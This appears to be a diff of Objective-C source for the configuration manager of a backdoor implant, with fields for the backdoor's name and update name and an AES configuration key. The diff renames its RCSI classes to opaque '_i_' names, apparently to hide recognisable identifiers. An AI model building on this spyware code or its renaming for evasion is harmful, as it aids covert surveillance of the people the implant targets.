@@ -21,7 +21,9 @@
 #import "RCSISharedMemory.h"
 #import "RCSIInfoManager.h"
 
-static RCSIConfManager *sharedConfManager = nil;
+#import "RCSIGlobals.h"
+
+static _i_ConfManager *sharedInstance = nil;
 
 //#define DEBUG_
 
@@ -29,32 +31,32 @@ static RCSIConfManager *sharedConfManager = nil;
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSIConfManager
+@implementation _i_ConfManager
 
 @synthesize mGlobalConfiguration, mBackdoorName, mBackdoorUpdateName, mShouldReloadConfiguration;
 @synthesize mConfigTimestamp;
 
-+ (RCSIConfManager *)sharedInstance
++ (_i_ConfManager *)sharedInstance
 {
   @synchronized(self)
   {
-  if (sharedConfManager == nil)
+  if (sharedInstance == nil)
     {
       [[self alloc] init];
     }
   }
   
-  return sharedConfManager;
+  return sharedInstance;
 }
 
 + (id)allocWithZone: (NSZone *)aZone
 {
   @synchronized(self)
   {
-  if (sharedConfManager == nil)
+  if (sharedInstance == nil)
     {
-      sharedConfManager = [super allocWithZone: aZone];
-      return sharedConfManager;
+      sharedInstance = [super allocWithZone: aZone];
+      return sharedInstance;
     }
   }
   
@@ -93,7 +95,7 @@ static RCSIConfManager *sharedConfManager = nil;
   
   @synchronized(myClass)
   {
-    if (sharedConfManager != nil)
+    if (sharedInstance != nil)
       {
         self = [super init];
         
@@ -103,7 +105,7 @@ static RCSIConfManager *sharedConfManager = nil;
             NSData *temp = [NSData dataWithBytes: gConfAesKey
                                           length: CC_MD5_DIGEST_LENGTH];
             
-            mEncryption = [[RCSIEncryption alloc] initWithKey: temp];
+            mEncryption = [[_i_Encryption alloc] initWithKey: temp];
             
             mBackdoorName = [aName copy];
 
@@ -120,7 +122,7 @@ static RCSIConfManager *sharedConfManager = nil;
       }
   }
   
-  return sharedConfManager;
+  return sharedInstance;
 }
 
 - (void)dealloc
@@ -331,14 +333,14 @@ static RCSIConfManager *sharedConfManager = nil;
   
   NSData *msgData = [[NSData alloc] initWithBytes: &reload length:sizeof(shMemoryLog)];
   
-  [RCSISharedMemory sendMessageToCoreMachPort: msgData withMode: @"kRunLoopEventManagerMode"];
+  [_i_SharedMemory sendMessageToCoreMachPort: msgData withMode: @"kRunLoopEventManagerMode"];
   
   [msgData release];
   
 }
 
 
-- (RCSIEncryption *)encryption
+- (_i_Encryption *)encryption
 {
   return mEncryption;
 }
